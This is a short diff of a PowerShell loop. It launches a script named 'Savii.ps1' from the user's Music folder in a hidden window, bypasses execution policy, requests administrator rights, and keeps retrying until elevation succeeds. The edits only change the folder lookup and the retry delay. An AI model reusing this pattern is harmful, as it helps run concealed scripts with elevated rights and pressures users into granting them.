@@ -1,17 +1,17 @@
 do {
     try {
-        $scriptPath = Join-Path ([Environment]::GetFolderPath("Music")) "Savii.ps1"
+        $scriptPath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::MyMusic)) "Savii.ps1"
         if (Test-Path $scriptPath) {
             Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
             $success = $true
         } else {
             Write-Host "Script not found at: $scriptPath" -ForegroundColor Red
             $success = $false
-            Start-Sleep -Seconds 2
+            Start-Sleep -Seconds 1
         }
     } catch {
         Write-Host "Error: $_" -ForegroundColor Red
         $success = $false
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 1
     }
 } until ($success)
